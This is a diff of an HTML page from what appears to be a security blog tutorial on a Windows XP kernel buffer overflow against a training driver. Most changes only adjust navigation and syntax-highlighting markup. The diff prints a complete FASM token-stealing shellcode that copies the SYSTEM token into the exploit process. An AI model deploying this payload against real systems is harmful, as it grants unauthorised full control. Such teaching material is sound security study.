@@ -30,23 +30,21 @@
 
 		    <div class="navbar-collapse collapse" id="navbar-main">
 		      <ul class="nav navbar-nav navbar-right">
-                <li class="active"><a href="/">Home</a></li>
+            <li ><a href="/about.html">About</a></li>
 		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
-                <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
+            <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
 		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
 		      </ul>
 		    </div>
 		</div>
-	</div>
+  </div>
 
 	<div class="container">
 		
 		<div class="row">
 			<div class="col-sm-12">
-                <h1 id="kernel-buffer-overflow-on-windows">Kernel buffer overflow on Windows</h1>
-<h2 id="introduction">Introduction</h2>
-
-<p>The buffer overflow are cool in user-land but they can be more funny in 
+        <h1>Kernel buffer overflow on Windows </h1>
+        <p>The buffer overflow are cool in user-land but they can be more funny in 
 kernel-land. This time, we will use a buffer overflow to make an escalade 
 privilege to get the SYSTEM rights, so we will could make anything we want on 
 the system. To train us, we don’t need to code a driver by ourself: 0vercl0k 
@@ -401,64 +399,64 @@ In XP, the identifier of SYSTEM process is <em>4</em> and we can get our PID wit
 <code class="highlighter-rouge">GetCurrentProcessId()</code>. With these information, we can code our shellcode. 
 I have coded mine with the FASM syntax:</p>
 
-<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">format</span> <span class="n">PE</span> <span class="n">GUI</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">format</span> <span class="nv">PE</span> <span class="nv">GUI</span> <span class="mf">4.0</span>
 
-<span class="n">start</span><span class="o">:</span>
+<span class="nl">start:</span>
 
-<span class="c">;--------------------------------</span>
-<span class="c">; 			Stack</span>
-<span class="c">;--------------------------------</span>
-<span class="c">; ESP-8: EPROCESS+0x088 system</span>
-<span class="c">;--------------------------------</span>
-<span class="c">; ESP-4: EPROCESS+0x088 exploit</span>
-<span class="c">;--------------------------------</span>
-<span class="k">push</span> <span class="mh">0xFFFFFFFF</span>
-<span class="k">push</span> <span class="mh">0xFFFFFFFF</span>
+<span class="c1">;--------------------------------</span>
+<span class="c1">; 			Stack</span>
+<span class="c1">;--------------------------------</span>
+<span class="c1">; ESP-8: EPROCESS+0x088 system</span>
+<span class="c1">;--------------------------------</span>
+<span class="c1">; ESP-4: EPROCESS+0x088 exploit</span>
+<span class="c1">;--------------------------------</span>
+<span class="nf">push</span> <span class="mh">0xFFFFFFFF</span>
+<span class="nf">push</span> <span class="mh">0xFFFFFFFF</span>
 
-<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">fs</span><span class="o">:</span><span class="mh">0x124</span><span class="err">]</span>     <span class="c">; +0x120 PrcbData : _KPRCB | +0x004 CurrentThread : _KTHREAD			</span>
-<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x44</span><span class="err">]</span>   <span class="c">; +0x034 ApcState : _KAPC_STATE | +0x010 Process : _KPROCESS</span>
-<span class="k">add</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x88</span>           <span class="c">; +0x088 ActiveProcessLinks : _LIST_ENTRY</span>
-<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">edx</span>            <span class="c">; Our linked list \o/ We save the first structure</span>
+<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">fs</span><span class="p">:</span><span class="mh">0x124</span><span class="p">]</span>     <span class="c1">; +0x120 PrcbData : _KPRCB | +0x004 CurrentThread : _KTHREAD			</span>
+<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x44</span><span class="p">]</span>   <span class="c1">; +0x034 ApcState : _KAPC_STATE | +0x010 Process : _KPROCESS</span>
+<span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x88</span>           <span class="c1">; +0x088 ActiveProcessLinks : _LIST_ENTRY</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edx</span>            <span class="c1">; Our linked list \o/ We save the first structure</span>
 
-<span class="n">searchProcess</span><span class="o">:</span>
-<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">-</span> <span class="mh">0x4</span><span class="err">]</span>    <span class="c">; +0x084 UniqueProcessId</span>
-<span class="k">cmp</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x4</span>            <span class="c">; SYSTEM PID</span>
-<span class="k">je</span> <span class="n">sysProcFound</span>
-<span class="k">cmp</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x41414141</span>     <span class="c">; Our exploit PID</span>
-<span class="k">je</span> <span class="n">exploitProcFound</span>
+<span class="nl">searchProcess:</span>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">-</span> <span class="mh">0x4</span><span class="p">]</span>    <span class="c1">; +0x084 UniqueProcessId</span>
+<span class="nf">cmp</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x4</span>            <span class="c1">; SYSTEM PID</span>
+<span class="nf">je</span> <span class="nv">sysProcFound</span>
+<span class="nf">cmp</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x41414141</span>     <span class="c1">; Our exploit PID</span>
+<span class="nf">je</span> <span class="nv">exploitProcFound</span>
 
-<span class="n">nextProcess</span><span class="o">:</span>
-<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[edx]</span>          <span class="c">; Next process (Flink)</span>
-<span class="k">cmp</span> <span class="n">edx</span><span class="p">,</span> <span class="n">ebx</span>            <span class="c">; We are back at the starting point</span>
-<span class="k">je</span> <span class="n">retApp</span>				
-<span class="k">jmp</span> <span class="n">searchProcess</span>       <span class="c">; We loop!</span>
+<span class="nl">nextProcess:</span>
+<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="p">]</span>          <span class="c1">; Next process (Flink)</span>
+<span class="nf">cmp</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">; We are back at the starting point</span>
+<span class="nf">je</span> <span class="nv">retApp</span>				
+<span class="nf">jmp</span> <span class="nv">searchProcess</span>       <span class="c1">; We loop!</span>
 
-<span class="n">sysProcFound</span><span class="o">:</span>
-<span class="k">mov</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">edx</span>
-<span class="k">jmp</span> <span class="n">allPIDFound</span>
+<span class="nl">sysProcFound:</span>
+<span class="nf">mov</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">edx</span>
+<span class="nf">jmp</span> <span class="nb">al</span><span class="nv">lPIDFound</span>
 
-<span class="n">exploitProcFound</span><span class="o">:</span>
-<span class="k">mov</span> <span class="p">[esp],</span> <span class="n">edx</span>
+<span class="nl">exploitProcFound:</span>
+<span class="nf">mov</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nb">edx</span>
 
-<span class="n">allPIDFound</span><span class="o">:</span>
-<span class="k">cmp</span> <span class="p">[esp],</span> <span class="n">dword</span> <span class="mh">0xFFFFFFFF</span>
-<span class="k">je</span> <span class="n">nextProcess</span>
-<span class="k">cmp</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">dword</span> <span class="mh">0xFFFFFFFF</span>
-<span class="k">je</span> <span class="n">nextProcess</span>
+<span class="nl">allPIDFound:</span>
+<span class="nf">cmp</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="kt">dword</span> <span class="mh">0xFFFFFFFF</span>
+<span class="nf">je</span> <span class="nv">nextProcess</span>
+<span class="nf">cmp</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="kt">dword</span> <span class="mh">0xFFFFFFFF</span>
+<span class="nf">je</span> <span class="nv">nextProcess</span>
 
-<span class="c">; We copy the SYSTEM token</span>
-<span class="k">pop</span> <span class="n">edi</span>                 <span class="c">; Exploit</span>
-<span class="k">pop</span> <span class="n">esi</span>	                <span class="c">; System</span>
-<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="err">]</span>   <span class="c">; 0xC8 - 0x88 = 0x40 | +0x0c8 Token : _EX_FAST_REF</span>
-<span class="k">mov</span> <span class="err">[</span><span class="n">edi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
+<span class="c1">; We copy the SYSTEM token</span>
+<span class="nf">pop</span> <span class="nb">edi</span>                 <span class="c1">; Exploit</span>
+<span class="nf">pop</span> <span class="nb">esi</span>	                <span class="c1">; System</span>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">]</span>   <span class="c1">; 0xC8 - 0x88 = 0x40 | +0x0c8 Token : _EX_FAST_REF</span>
+<span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">],</span> <span class="nb">eax</span>
 
-<span class="n">retApp</span><span class="o">:</span>
-<span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
-<span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3B</span>            <span class="c">; FS address in userland</span>
-<span class="k">mov</span> <span class="n">fs</span><span class="p">,</span> <span class="n">ax</span>
-<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="mh">0x42424242</span>     <span class="c">; Stack address</span>
-<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x43434343</span>     <span class="c">; Address of our function in our process</span>
-<span class="k">sysexit</span>
+<span class="nl">retApp:</span>
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3B</span>            <span class="c1">; FS address in userland</span>
+<span class="nf">mov</span> <span class="nb">fs</span><span class="p">,</span> <span class="nb">ax</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0x42424242</span>     <span class="c1">; Stack address</span>
+<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x43434343</span>     <span class="c1">; Address of our function in our process</span>
+<span class="nf">sysexit</span>
 </code></pre></div></div>
 
 <h2 id="final-exploit">Final exploit</h2>
